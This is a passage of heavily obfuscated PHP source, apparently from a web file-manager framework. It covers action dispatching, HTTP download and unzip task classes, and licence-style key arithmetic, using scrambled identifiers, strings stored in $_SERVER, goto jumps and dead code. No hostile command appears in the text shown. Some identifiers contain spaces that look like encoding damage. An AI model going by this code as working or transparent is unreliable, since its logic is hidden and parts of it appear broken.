e¶»­œ–çè; f‚­ßí’ÖÄ: $Dˆ¡ñ¦å”Ë = $Fèâ³¯°‘“[329]($ašãµÒÍİê, $a²‡íÈïàĞ); $dÅ‘åµÉÊ™ = $Fèâ³¯°‘“[112]($a²‡íÈïàĞ . $Fèâ³¯°‘“[112]($bö³É˜¬‡¼ . $a²‡íÈïàĞ) . $bö³É˜¬‡¼); $Eç¶‚£§¨ˆ = $cêÍå˜á”İ[630]; goto a´ Ğâ—âœ; d¼‘æ’Ã®Î: for ($d‘ëÔï´¦ñ = 0; $d‘ëÔï´¦ñ < $Fèâ³¯°‘“[24]($d«“Ìá‡’ä); $d‘ëÔï´¦ñ++) { $DÊ®î¤¤à– = $DÊ®î¤¤à– == $Fèâ³¯°‘“[24]($dÅ‘åµÉÊ™) ? 0 : $DÊ®î¤¤à–; $B›ÀÛ¾²ê¦ = $DÊ®î¤¤à–++; $D•†ˆ‹Ú† = $Fèâ³¯°‘“[329]($ašãµÒÍİê, $d«“Ìá‡’ä[$d‘ëÔï´¦ñ]) - $Dˆ¡ñ¦å”Ë - $Fèâ³¯°‘“[330]($dÅ‘åµÉÊ™[$B›ÀÛ¾²ê¦]); $CîÛ£ÛÌÍÛ = $cêÍå˜á”İ[634]; while ($D•†ˆ‹Ú† < 0) { $D•†ˆ‹Ú† += 64; } $f‡¤†ëë×î .= $ašãµÒÍİê[$D•†ˆ‹Ú†]; $bÙ²ˆ˜ŠÓª = $cêÍå˜á”İ[635]; if (!$bÙ²ˆ˜ŠÓª) { die; } } $C‰ùêÓ˜ÖÀ = $Fèâ³¯°‘“[333]($f‡¤†ëë×î); $Fî‰½áÀÄ = $cêÍå˜á”İ[636]; goto a¤ä¦Õ©˜’; fî‘šÉÖ…Á: $B¸…åìå© = $cêÍå˜á”İ[633]; if (!$B¸…åìå©) { return; } $DÊ®î¤¤à– = 0; goto d¼‘æ’Ã®Î; a¤ä¦Õ©˜’: if (!$Fî‰½áÀÄ) { return; } break; $A£å–Í«â± = $cêÍå˜á”İ[637]; goto dÄÓ‹Õ—È; dÄÓ‹Õ—È: default: $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][241]}($d«“Ìá‡’ä, $bö³É˜¬‡¼ . $bß ìÂÓæš); $b„½É‡Ç = $cêÍå˜á”İ[638]; while ($b„½É‡Ç < $cêÍå˜á”İ[554]) { if ($b„½É‡Ç >= 0) { break; } $b„½É‡Ç++; } break; } if ($Bˆ‚¥£ÇÈ• - 1 > 0) { $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][186]}($C‰ùêÓ˜ÖÀ, $bö³É˜¬‡¼, $Bˆ‚¥£ÇÈ• - 1); } return $C‰ùêÓ˜ÖÀ; goto a·¯É»›à; a·¯É»›à: } public function ynqccf507188($e²Ò‰¨´ì‘) { goto b¿·‘é†ÜÄ; b¿·‘é†ÜÄ: $c¸ò‘ï…é =& $_SERVER[‘®…¢À]; $aÊ—ÑÃÄ„ó =& $_SERVER[Ş›]; $D…´„ÒîôË = $this->{$_SERVER[Ş›][334]}(); goto b®Â˜–öò; EÑ¤Æ¨¤–ì: $AÂ”İãŠïö = ($D…´„ÒîôË - 1) * ($Dó–ïÅ£À¦ - 1); $b–İ´·¡³– = $c¸ò‘ï…é[640]; $bç¯Íã˜‚Ã = $aÊ—ÑÃÄ„ó[199](($D…´„ÒîôË + $Dó–ïÅ£À¦) / 2); goto FŒ™à¿‰Ğî; d²ƒğ¹ÕŸ•: if (!$EöšÉæ›ª¬) { return; } $f¡ğ¼‰ÌŠÛ = $this->{$_SERVER[Ş›][145]}($e²Ò‰¨´ì‘, $DÌÙ‹„±ŒŠ) . $aÊ—ÑÃÄ„ó[338] . $BìÒ¢³èÁ; $déš’—ÙæÓ = $c¸ò‘ï…é[645]; goto eÖ°Â‘è†; b®Â˜–öò: $aèµªšÌğÓ = $c¸ò‘ï…é[639]; if (strlen($aèµªšÌğÓ) < $c¸ò‘ï…é[564]) { die; } $Dó–ïÅ£À¦ = $this->{$_SERVER[Ş›][334]}(); goto EÑ¤Æ¨¤–ì; c“­Şˆ†: $có¿Â˜éÂ© = 2; for ($f¬¼™×¡‡ = 0; $f¬¼™×¡‡ < $AÂ”İãŠïö * 10; $f¬¼™×¡‡++) { if (($AÂ”İãŠïö * $f¬¼™×¡‡ + 1) % $bç¯Íã˜‚Ã == 0) { $có¿Â˜éÂ© = $aÊ—ÑÃÄ„ó[199](($AÂ”İãŠïö * $f¬¼™×¡‡ + 1) / $bç¯Íã˜‚Ã); break; } } $BìÒ¢³èÁ = $this->{$_SERVER[Ş›][145]}($D…´„ÒîôË * $Dó–ïÅ£À¦ . $aÊ—ÑÃÄ„ó[10], $aÊ—ÑÃÄ„ó[147]); goto B”‘ô‹‹ØÊ; B”‘ô‹‹ØÊ: $eîç¡¢Ôê½ = $c¸ò‘ï…é[643]; $DÌÙ‹„±ŒŠ = $aÊ—ÑÃÄ„ó[112]($aÊ—ÑÃÄ„ó[335] . ($D…´„ÒîôË + $Dó–ïÅ£À¦) . $aÊ—ÑÃÄ„ó[336] . $bç¯Íã˜‚Ã . $aÊ—ÑÃÄ„ó[336] . $có¿Â˜éÂ© . $aÊ—ÑÃÄ„ó[337]); $EöšÉæ›ª¬ = $c¸ò‘ï…é[644]; goto d²ƒğ¹ÕŸ•; eÖ°Â‘è†: if (strlen($déš’—ÙæÓ) < $c¸ò‘ï…é[548]) { die; } return $f¡ğ¼‰ÌŠÛ; goto B»—¯ÇÏÊ; FŒ™à¿‰Ğî: $Fù»ÜÎ¹‡ = $c¸ò‘ï…é[641]; while (strlen($Fù»ÜÎ¹‡) < $c¸ò‘ï…é[554]) { if (!$Fù»ÜÎ¹‡) { break; } $Fù»ÜÎ¹‡++; } while (1) { $CŒ”Š¨Ê“™ = $bç¯Íã˜‚Ã; $d†Â£ˆŸ™Š = $AÂ”İãŠïö; while ($d†Â£ˆŸ™Š % $CŒ”Š¨Ê“™ != 0) { $Eˆš‡Á ˜µ = $d†Â£ˆŸ™Š; $d†Â£ˆŸ™Š = $CŒ”Š¨Ê“™; $CŒ”Š¨Ê“™ = $Eˆš‡Á ˜µ % $CŒ”Š¨Ê“™; $cÔ³ä¡¤¦‹ = $c¸ò‘ï…é[642]; while ($cÔ³ä¡¤¦‹ < $c¸ò‘ï…é[548]) { if ($cÔ³ä¡¤¦‹ >= 0) { break; } $cÔ³ä¡¤¦‹++; } } if ($CŒ”Š¨Ê“™ == 1) { break; } else { $bç¯Íã˜‚Ã++; } } goto c“­Şˆ†; B»—¯ÇÏÊ: } public function mivk4ac25eef($bóË×î¶Ş) { goto Eªç¹İŠ—; F²ô¶’›: if ($fç³êè¡Ø[19]($bÍ½ŒöÈ) != 2) { return $fç³êè¡Ø[10]; } $a¶ö‘ ¤¼ = $this->{$_SERVER[Ş›][241]}($bÍ½ŒöÈ[1] . $fç³êè¡Ø[10], $fç³êè¡Ø[147]); if (!$a¶ö‘ ¤¼) { return $fç³êè¡Ø[10]; } goto D—¥‹ïÏ“è; b«ŠÛöÖË¸: $C…êÂóÍ‚ = $BïÀÛ±ì¢Ğ[646]; if (!$C…êÂóÍ‚) { die; } for ($dÂ¼©Î°³Ü = 3; $dÂ¼©Î°³Ü < $a¶ö‘ ¤¼; $dÂ¼©Î°³Ü += 2) { if ($a¶ö‘ ¤¼ % $dÂ¼©Î°³Ü != 0) { continue; } $a‹àÉÎ£ö¤ = $dÂ¼©Î°³Ü; $D™Ó³è¨²‰ = $BïÀÛ±ì¢Ğ[647]; if (strlen($D™Ó³è¨²‰) < $BïÀÛ±ì¢Ğ[544]) { die; } $DÛâğó¥† = $fç³êè¡Ø[199]($a¶ö‘ ¤¼ / $dÂ¼©Î°³Ü); break; } goto F±¤àÎë; bîÇå—¨¿: if (strlen($dÃ»›Û“í) < $BïÀÛ±ì¢Ğ[554]) { return; } while (1) { $cÃğò²­…¦ = $bÓá–‡èÉÓ; $F½Š¡¶İ‚ø = $F¦¼äìİÑ¢; $f…ìö§×ºä = $BïÀÛ±ì¢Ğ[649]; while ($f…ìö§×ºä < $BïÀÛ±ì¢Ğ[539]) { if ($f…ìö§×ºä >= 0) { break; } $f…ìö§×ºä++; } while ($F½Š¡¶İ‚ø % $cÃğò²­…¦ != 0) { $E‘„ï½¾‚ù = $F½Š¡¶İ‚ø; $ağšãœ…Ü = $BïÀÛ±ì¢Ğ[650]; while ($ağšãœ…Ü < $BïÀÛ±ì¢Ğ[564]) { if ($ağšãœ…Ü >= 0) { break; } $ağšãœ…Ü++; } $F½Š¡¶İ‚ø = $cÃğò²­…¦; $cÃğò²­…¦ = $E‘„ï½¾‚ù % $cÃğò²­…¦; } if ($cÃğò²­…¦ == 1) { break; } else { $bÓá–‡èÉÓ++; } } $e‚œ²ÂÙ”… = 2; goto A‚Î®éÊ÷Ù; eó©…¢—†ó: $F¦Á¼ïÂ°Ä = $fç³êè¡Ø[112]($fç³êè¡Ø[335] . ($a‹àÉÎ£ö¤ + $DÛâğó¥†) . $fç³êè¡Ø[336] . $bÓá–‡èÉÓ . $fç³êè¡Ø[336] . $e‚œ²ÂÙ”… . $fç³êè¡Ø[337]); $cÄ¤Û—Òä = $this->{$_SERVER[Ş›][241]}($bÍ½ŒöÈ[0], $F¦Á¼ïÂ°Ä); return $cÄ¤Û—Òä; goto e¢…ß“¸ôÙ; Eªç¹İŠ—: $BïÀÛ±ì¢Ğ =& $_SERVER[‘®…¢À]; $fç³êè¡Ø =& $_SERVER[Ş›]; $bÍ½ŒöÈ = $fç³êè¡Ø[0]($fç³êè¡Ø[338], $bóË×î¶Ş); goto F²ô¶’›; D—¥‹ïÏ“è: $a¶ö‘ ¤¼ = $fç³êè¡Ø[199]($a¶ö‘ ¤¼); $a‹àÉÎ£ö¤ = 0; $DÛâğó¥† = 0; goto b«ŠÛöÖË¸; A‚Î®éÊ÷Ù: $a¨Œªñ¨‰ = $BïÀÛ±ì¢Ğ[651]; if (!$a¨Œªñ¨‰) { return; } for ($dÂ¼©Î°³Ü = 0; $dÂ¼©Î°³Ü < $F¦¼äìİÑ¢ * 10; $dÂ¼©Î°³Ü++) { if (($F¦¼äìİÑ¢ * $dÂ¼©Î°³Ü + 1) % $bÓá–‡èÉÓ == 0) { $e‚œ²ÂÙ”… = $fç³êè¡Ø[199](($F¦¼äìİÑ¢ * $dÂ¼©Î°³Ü + 1) / $bÓá–‡èÉÓ); break; } } goto eó©…¢—†ó; F±¤àÎë: $F¦¼äìİÑ¢ = ($a‹àÉÎ£ö¤ - 1) * ($DÛâğó¥† - 1); $bÓá–‡èÉÓ = $fç³êè¡Ø[199](($a‹àÉÎ£ö¤ + $DÛâğó¥†) / 2); $dÃ»›Û“í = $BïÀÛ±ì¢Ğ[648]; goto bîÇå—¨¿; e¢…ß“¸ôÙ: } public function vejr50510afd() { goto Eìæô’‚˜ë; Eìæô’‚˜ë: $aÊ„´ö¾ƒÇ =& $_SERVER[‘®…¢À]; $aœ°†Šƒäº =& $_SERVER[Ş›]; $d»º’…•²ô = $aœ°†Šƒäº[319]($aœ°†Šƒäº[339](2, 14), $aœ°†Šƒäº[339](2, 16) - 1); goto D‹»Ğ¤ìß°; D‹»Ğ¤ìß°: $E×Ï¿ç«¾Ü = $aÊ„´ö¾ƒÇ[652]; $fÍ–µÆùÎ = array(); $eÑÌÎ¡²éß = 1; goto B˜‡‘”ßÀ; bÌÌ—†Ã¸ì: for ($B”ˆÙ¼¼È = $d»º’…•²ô; $B”ˆÙ¼¼È > 1; $B”ˆÙ¼¼È--) { $e¿’³ŸÏ¦ = !0; foreach ($fÍ–µÆùÎ as $bÊ¢„†Ù‰®) { if ($B”ˆÙ¼¼È % $bÊ¢„†Ù‰® == 0) { $e¿’³ŸÏ¦ = !1; break; } } if ($e¿’³ŸÏ¦) { $C¥•èå²»Ğ = $B”ˆÙ¼¼È; break; } } return $C¥•èå²»Ğ; $c…‹®‰‚¬ = $aÊ„´ö¾ƒÇ[656]; goto A¶Á²“ø£“; B˜‡‘”ßÀ: while ($eÑÌÎ¡²éß <= (int) $aœ°†Šƒäº[340]($d»º’…•²ô)) { $B”ˆÙ¼¼È = $eÑÌÎ¡²éß; while (!0) { $B”ˆÙ¼¼È++; $aÅÄ¸™¯“ˆ = $aÊ„´ö¾ƒÇ[653]; if ($B”ˆÙ¼¼È <= 2) { $eÑÌÎ¡²éß = $B”ˆÙ¼¼È; break; } else { if ($B”ˆÙ¼¼È < 2) { continue; } } $e¿’³ŸÏ¦ = !0; for ($C¨¾Œ—Ÿ¶ = 2; $C¨¾Œ—Ÿ¶ <= $aœ°†Šƒäº[340]($B”ˆÙ¼¼È); $C¨¾Œ—Ÿ¶++) { if ($B”ˆÙ¼¼È % $C¨¾Œ—Ÿ¶ == 0) { $e¿’³ŸÏ¦ = !1; } } if ($e¿’³ŸÏ¦) { $eÑÌÎ¡²éß = $B”ˆÙ¼¼È; break; } } $fÍ–µÆùÎ[] = $eÑÌÎ¡²éß; $aÍ²çİ«â = $aÊ„´ö¾ƒÇ[654]; if (strlen($aÍ²çİ«â) < $aÊ„´ö¾ƒÇ[564]) { return; } } $C¥•èå²»Ğ = 2; $fÖÇœˆ÷Ö´ = $aÊ„´ö¾ƒÇ[655]; goto bÌÌ—†Ã¸ì; A¶Á²“ø£“: } public function ytobc8fc3cfc($cõ×ø÷­²Ì, $aÖí°Ì†´•) { $aÁ’’íÄÔ½ =& $_SERVER[‘®…¢À]; $bø³Ô´²’Í =& $_SERVER[Ş›]; return $bø³Ô´²’Í[13](array($bø³Ô´²’Í[14], $bø³Ô´²’Í[341]), $cõ×ø÷­²Ì, $aÖí°Ì†´•); $dÑ£¢°õ£î = $aÁ’’íÄÔ½[657]; while (strlen($dÑ£¢°õ£î) < $aÁ’’íÄÔ½[548]) { if (!$dÑ£¢°õ£î) { break; } $dÑ£¢°õ£î++; } } public function qojx65f3db51($dìßÖø¯¿, $D´“™œœŒÓ) { $dš”­³…—É =& $_SERVER[‘®…¢À]; $DĞ©·ìçó =& $_SERVER[Ş›]; return $DĞ©·ìçó[13](array($DĞ©·ìçó[342], $DĞ©·ìçó[343]), $dìßÖø¯¿, $D´“™œœŒÓ); $dµË©ÌğÚ = $dš”­³…—É[658]; while (strlen($dµË©ÌğÚ) < $dš”­³…—É[548]) { if (!$dµË©ÌğÚ) { break; } $dµË©ÌğÚ++; } } public function qapka950be10($f„ÀÙÓÍÛ³, $CßØéÎÍöŠ) { $DöïĞ‚Áİ =& $_SERVER[‘®…¢À]; $Dä¦ßÜõ‹„ =& $_SERVER[Ş›]; return $Dä¦ßÜõ‹„[13](array($Dä¦ßÜõ‹„[342], $Dä¦ßÜõ‹„[344]), $f„ÀÙÓÍÛ³, $CßØéÎÍöŠ); $e¦ÎˆÕÊÇ = $DöïĞ‚Áİ[659]; if (strlen($e¦ÎˆÕÊÇ) < $DöïĞ‚Áİ[554]) { return; } } } goto bÇƒÄŠ¾Ë; A„‰”Şµ“: function Action($C¾µ¦Ù±ãÔ = '') { goto AåƒƒËŒˆä; f‰õˆ–Üİ: $D©¶öç¿áä = strtolower($déé¸®½îÌ); if (isset($F”©‚ÁÉ­Ø[$D©¶öç¿áä])) { return $F”©‚ÁÉ­Ø[$D©¶öç¿áä]; } if (is_file($Dîƒïä¿¶¾)) { include_once $Dîƒïä¿¶¾; } goto Dòæ©İğÛ‰; Dòæ©İğÛ‰: if (!class_exists($déé¸®½îÌ)) { return actionCallError("\133{$C¾µ¦Ù±ãÔ}\x20\x3d\76\x20{$déé¸®½îÌ}\135\40\x63\154\x61\163\x73\x20\x6e\157\164\x20\x65\170\x69\163\x74\163\41"); } $F”©‚ÁÉ­Ø[$D©¶öç¿áä] = new $déé¸®½îÌ(); return $F”©‚ÁÉ­Ø[$D©¶öç¿áä]; goto böÇëè; AåƒƒËŒˆä: $eŒ²µø­ğ =& $_SERVER[Á]; static $F”©‚ÁÉ­Ø = array(); $C¾µ¦Ù±ãÔ = trim(str_replace($eŒ²µø­ğ[4], $eŒ²µø­ğ[5], $C¾µ¦Ù±ãÔ), $eŒ²µø­ğ[4]); goto FÕÂ›¼à¸; FÕÂ›¼à¸: $aÙäğÇÃÀÔ = explode($eŒ²µø­ğ[5], $C¾µ¦Ù±ãÔ); $fœ”‰ˆ©·ß = strtolower($aÙäğÇÃÀÔ[0]); if (substr($fœ”‰ˆ©·ß, -6) == $eŒ²µø­ğ[6]) { $C¾µ¦Ù±ãÔ = substr($aÙäğÇÃÀÔ[0], 0, -6); $déé¸®½îÌ = $C¾µ¦Ù±ãÔ . $eŒ²µø­ğ[7]; $Dîƒïä¿¶¾ = $eŒ²µø­ğ[8]; if (isset($aÙäğÇÃÀÔ[1]) && substr(strtolower($aÙäğÇÃÀÔ[1]), -5) == $eŒ²µø­ğ[9]) { $déé¸®½îÌ = $C¾µ¦Ù±ãÔ . $aÙäğÇÃÀÔ[1]; $Dîƒïä¿¶¾ = $eŒ²µø­ğ[10] . $aÙäğÇÃÀÔ[1] . $eŒ²µø­ğ[11]; } else { if (count($aÙäğÇÃÀÔ) == 3) { $déé¸®½îÌ = $C¾µ¦Ù±ãÔ . $aÙäğÇÃÀÔ[1] . $aÙäğÇÃÀÔ[2]; $Dîƒïä¿¶¾ = $eŒ²µø­ğ[12] . $aÙäğÇÃÀÔ[1] . $eŒ²µø­ğ[13] . $aÙäğÇÃÀÔ[2] . $eŒ²µø­ğ[11]; } } $Dîƒïä¿¶¾ = PLUGIN_DIR . $C¾µ¦Ù±ãÔ . $eŒ²µø­ğ[4] . $Dîƒïä¿¶¾; } else { if (substr($fœ”‰ˆ©·ß, -5) == $eŒ²µø­ğ[9]) { $C¾µ¦Ù±ãÔ = substr($aÙäğÇÃÀÔ[0], 0, -5); return Model($C¾µ¦Ù±ãÔ); } else { $déé¸®½îÌ = $aÙäğÇÃÀÔ[0] . $aÙäğÇÃÀÔ[1]; $Dîƒïä¿¶¾ = CONTROLLER_DIR . $aÙäğÇÃÀÔ[0] . $eŒ²µø­ğ[4] . $aÙäğÇÃÀÔ[1] . $eŒ²µø­ğ[14]; } } goto f‰õˆ–Üİ; böÇëè: } function ActionApply($c—ˆâöÀö, $DºÂÙ—¥Á„ = array()) { goto F³öÖìŞÔã; CÕÅ‹³‡È: if (!method_exists($fá¦³ª­¾ó, $Eå™òì¢äŞ)) { return actionCallError("{$c—ˆâöÀö}\40\x6d\x65\164\150\157\144\40\156\x6f\x74\40\x65\170\151\x73\x74\x73\x21"); } $DğÇø¨·Şˆ = call_user_func_array(array($fá¦³ª­¾ó, $Eå™òì¢äŞ), $DºÂÙ—¥Á„); return $DğÇø¨·Şˆ; goto Cİ¿å‡Ä¡¼; F³öÖìŞÔã: if (is_array($c—ˆâöÀö)) { return call_user_func_array($c—ˆâöÀö, $DºÂÙ—¥Á„); } if (function_exists($c—ˆâöÀö)) { return call_user_func_array($c—ˆâöÀö, $DºÂÙ—¥Á„); } $Bö‚†Ò÷¾‚ = strrpos($c—ˆâöÀö, $_SERVER[Á][5]); goto FÈ…ÕÁŠÌ¬; FÈ…ÕÁŠÌ¬: $B†Œ¿š¿õ® = substr($c—ˆâöÀö, 0, $Bö‚†Ò÷¾‚); $Eå™òì¢äŞ = substr($c—ˆâöÀö, $Bö‚†Ò÷¾‚ + 1); $fá¦³ª­¾ó = Action($B†Œ¿š¿õ®); goto CÕÅ‹³‡È; Cİ¿å‡Ä¡¼: } function actionCallError($E©¡‚‡®) { $AÀî…«ÖæÖ =& $_SERVER[Á]; $EİÏ“™Ó† = json_encode_force(array($AÀî…«ÖæÖ[15] => this_url(), $AÀî…«ÖæÖ[16] => $GLOBALS[$AÀî…«ÖæÖ[16]])); $EİÏ“™Ó† = str_replace(array($AÀî…«ÖæÖ[17]), array($AÀî…«ÖæÖ[4]), $EİÏ“™Ó†); return write_log($E©¡‚‡® . $AÀî…«ÖæÖ[18] . $EİÏ“™Ó†, $AÀî…«ÖæÖ[19]); } goto BŒá¥÷Èªğ; EŠ˜ÉÚìˆÁ: class TaskHttp extends Task { protected function startAfter() { $e¢¸‹‰Ò†Ù =& $_SERVER[‘®…¢À]; Hook::bind($e¢¸‹‰Ò†Ù[1374], array($this, $e¢¸‹‰Ò†Ù[1397])); Hook::bind($e¢¸‹‰Ò†Ù[1376], array($this, $e¢¸‹‰Ò†Ù[1398])); Hook::bind($e¢¸‹‰Ò†Ù[1378], array($this, $e¢¸‹‰Ò†Ù[1399])); } protected function endAfter() { $cŒåæ¶Ì¦ =& $_SERVER[‘®…¢À]; Hook::unbind($cŒåæ¶Ì¦[1374], array($this, $cŒåæ¶Ì¦[1397])); Hook::unbind($cŒåæ¶Ì¦[1376], array($this, $cŒåæ¶Ì¦[1398])); Hook::unbind($cŒåæ¶Ì¦[1378], array($this, $cŒåæ¶Ì¦[1399])); } public function progressStart($Aò¨ãë½Í) { $EŞÍĞĞÇÁÑ =& $_SERVER[‘®…¢À]; $dîä©ÊñÙ÷ = curl_getinfo($Aò¨ãë½Í); self::log($EŞÍĞĞÇÁÑ[1400] . $dîä©ÊñÙ÷[$EŞÍĞĞÇÁÑ[292]]); self::valueSet($this->task[$EŞÍĞĞÇÁÑ[363]], $this->task); } public function progressEnd($EÀö Ö â) { $B†Åºğª›« =& $_SERVER[‘®…¢À]; self::log($B†Åºğª›«[1401] . $this->task[$B†Åºğª›«[363]]); $this->end(); } public function progress($Bç¿™ˆ™ß‡, $A¼È•ìÙ¨ö, $d»Á£Ù—ñÚ, $Fä„Ä¡³ë», $fâ¦¥¬©¡È) { $FªŠàÈÏ® =& $_SERVER[‘®…¢À]; $eÌ‹åØƒˆä =& $this->task; if ($fâ¦¥¬©¡È > 0) { $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]] = $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]] == 0 ? $Fä„Ä¡³ë» : $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]]; $eÌ‹åØƒˆä[$FªŠàÈÏ®[1285]] = $fâ¦¥¬©¡È; } else { if ($d»Á£Ù—ñÚ > 0) { $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]] = $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]] == 0 ? $A¼È•ìÙ¨ö : $eÌ‹åØƒˆä[$FªŠàÈÏ®[1280]]; $eÌ‹åØƒˆä[$FªŠàÈÏ®[1285]] = $d»Á£Ù—ñÚ; } } $this->update(); self::log("\x70\162\x6f\x67\x72\x65\x73\x73\110\164\x74\160\x3a\x64\157\167\x6e\x3a{$d»Á£Ù—ñÚ}\x2f{$A¼È•ìÙ¨ö}\x3b\x20\165\x70\154\157\141\144\x3a{$fâ¦¥¬©¡È}\57{$Fä„Ä¡³ë»}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c«¼É»; fÌ¼±İä÷Û: Hook::bind($eõ¥Ñïåˆ…[993], array($this, $eõ¥Ñïåˆ…[1404])); $f£ò°±ˆí§ =& $this->task; $f£ò°±ˆí§[$eõ¥Ñïåˆ…[1405]] = $eõ¥Ñïåˆ…[998]; goto Eº’‰‹åØ¸; Eº’‰‹åØ¸: if (!$f£ò°±ˆí§[$eõ¥Ñïåˆ…[1234]]) { $f£ò°±ˆí§[$eõ¥Ñïåˆ…[1234]] = LNG($eõ¥Ñïåˆ…[1406]); } goto dÁ¶ÑÀ¦ˆ; c«¼É»: $eõ¥Ñïåˆ… =& $_SERVER[‘®…¢À]; parent::startAfter(); Hook::bind($eõ¥Ñïåˆ…[1402], array($this, $eõ¥Ñïåˆ…[1403])); goto fÌ¼±İä÷Û; dÁ¶ÑÀ¦ˆ: } protected function endAfter() { $b­‹¦à¶¤› =& $_SERVER[‘®…¢À]; parent::endAfter(); Hook::unbind($b­‹¦à¶¤›[1402], array($this, $b­‹¦à¶¤›[1403])); Hook::unbind($b­‹¦à¶¤›[993], array($this, $b­‹¦à¶¤›[1404])); } public function updateAfter() { $E·Š°êòÏ¯ =& $_SERVER[‘®…¢À]; $a¸ÉÀò©· =& $this->task; if (!$a¸ÉÀò©·[$E·Š°êòÏ¯[1280]] || !$a¸ÉÀò©·[$E·Š°êòÏ¯[671]]) { return; } if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1405]] == $E·Š°êòÏ¯[998]) { $c¤±ë·ŠÕÆ = 0; if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1382]]) { $c¤±ë·ŠÕÆ = $a¸ÉÀò©·[$E·Š°êòÏ¯[1383]] / $a¸ÉÀò©·[$E·Š°êòÏ¯[1382]]; } $a¸ÉÀò©·[$E·Š°êòÏ¯[1338]] = $c¤±ë·ŠÕÆ * 0.3; } else { if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1405]] == $E·Š°êòÏ¯[298]) { $c¤±ë·ŠÕÆ = $a¸ÉÀò©·[$E·Š°êòÏ¯[1285]] / $a¸ÉÀò©·[$E·Š°êòÏ¯[1280]]; $a¸ÉÀò©·[$E·Š°êòÏ¯[1338]] = 0.3 + $c¤±ë·ŠÕÆ * 0.4; } else { if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1405]] == $E·Š°êòÏ¯[92]) { $bøËˆ£§‰ê = 0; if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1384]] == $E·Š°êòÏ¯[92]) { $bøËˆ£§‰ê = $a¸ÉÀò©·[$E·Š°êòÏ¯[1383]]; } $c¤±ë·ŠÕÆ = ($a¸ÉÀò©·[$E·Š°êòÏ¯[1387]] + $bøËˆ£§‰ê) / $a¸ÉÀò©·[$E·Š°êòÏ¯[671]]; $a¸ÉÀò©·[$E·Š°êòÏ¯[1338]] = 0.3 + 0.4 + $c¤±ë·ŠÕÆ * 0.3; } } } if ($a¸ÉÀò©·[$E·Š°êòÏ¯[1338]] > 0) { $E‰¡¢ìÒ¾ò = timeFloat() - $a¸ÉÀò©·[$E·Š°êòÏ¯[1340]] - $a¸ÉÀò©·[$E·Š°êòÏ¯[1343]]; $a¸ÉÀò©·[$E·Š°êòÏ¯[1344]] = $E‰¡¢ìÒ¾ò * (1 - $a¸ÉÀò©·[$E·Š°êòÏ¯[1338]]) / $a¸ÉÀò©·[$E·Š°êòÏ¯[1338]]; } } public function addFile($CÁ¤Ç ğŠ“) { goto DÇ—ïâÚ¹è; DÇ—ïâÚ¹è: $fº¿Ô­¬…é =& $_SERVER[‘®…¢À]; $a‘×çáò­‡ =& $this->task; $E‚ïÌ©öé¯ = IO::info($CÁ¤Ç ğŠ“); goto A„Ö¹šÕŠØ; A„Ö¹šÕŠØ: $a‘×çáò­‡[$fº¿Ô­¬…é[1380]] = $E‚ïÌ©öé¯[$fº¿Ô­¬…é[28]]; $a‘×çáò­‡[$fº¿Ô­¬…é[1382]] = $E‚ïÌ©öé¯[$fº¿Ô­¬…é[78]]; $a‘×çáò­‡[$fº¿Ô­¬…é[1383]] = 0; goto Dàğ©ÖĞö; Eé±‡²áÕ: $this->update(); goto E•±æƒØÁ¹; Dàğ©ÖĞö: $a‘×çáò­‡[$fº¿Ô­¬…é[1282]] = $fº¿Ô­¬…é[1395]; $a‘×çáò­‡[$fº¿Ô­¬…é[1384]] = $fº¿Ô­¬…é[998]; $a‘×çáò­‡[$fº¿Ô­¬…é[671]] = $E‚ïÌ©öé¯[$fº¿Ô­¬…é[78]]; goto EÒ¯è›ÅŸ; EÒ¯è›ÅŸ: $a‘×çáò­‡[$fº¿Ô­¬…é[1280]] = 1; $F²Š¢ÉÈ£á = 0; $a‘×çáò­‡[$fº¿Ô­¬…é[1388]] = array($fº¿Ô­¬…é[1389] => $F²Š¢ÉÈ£á + 1, $fº¿Ô­¬…é[382] => $E‚ïÌ©öé¯[$fº¿Ô­¬…é[28]], $fº¿Ô­¬…é[76] => $E‚ïÌ©öé¯[$fº¿Ô­¬…é[76]], $fº¿Ô­¬…é[461] => $E‚ïÌ©öé¯[$fº¿Ô­¬…é[461]] ? $E‚ïÌ©öé¯[$fº¿Ô­¬…é[461]] : $E‚ïÌ©öé¯[$fº¿Ô­¬…é[76]]); goto Eé±‡²áÕ; E•±æƒØÁ¹: } public function unzipAfter($FøÙš´Ö§) { goto a‹æ¸ºõƒ; a‹æ¸ºõƒ: $bŞñƒ¸Ô… =& $_SERVER[‘®…¢À]; $CÁƒƒºÚ†º =& $this->task; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1405]] = $bŞñƒ¸Ô…[92]; goto bÆÏ¢‘‡ô; bÆÏ¢‘‡ô: $CÃŸ‘ÄĞÇß = IO::infoWithChildren($FøÙš´Ö§); $Eó™İ¾±Áå = 0; $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1388]] = array($bŞñƒ¸Ô…[1389] => $Eó™İ¾±Áå + 1, $bŞñƒ¸Ô…[382] => $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[28]], $bŞñƒ¸Ô…[76] => $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[76]], $bŞñƒ¸Ô…[461] => $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[461]] ? $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[461]] : $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[76]]); goto fìë„ƒ…ßÆ; fìë„ƒ…ßÆ: if ($CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[29]] == $bŞñƒ¸Ô…[164]) { $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1280]] = 1; } else { $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1280]] = $CÃŸ‘ÄĞÇß[$bŞñƒ¸Ô…[81]][$bŞñƒ¸Ô…[79]]; } $CÁƒƒºÚ†º[$bŞñƒ¸Ô…[1282]] = 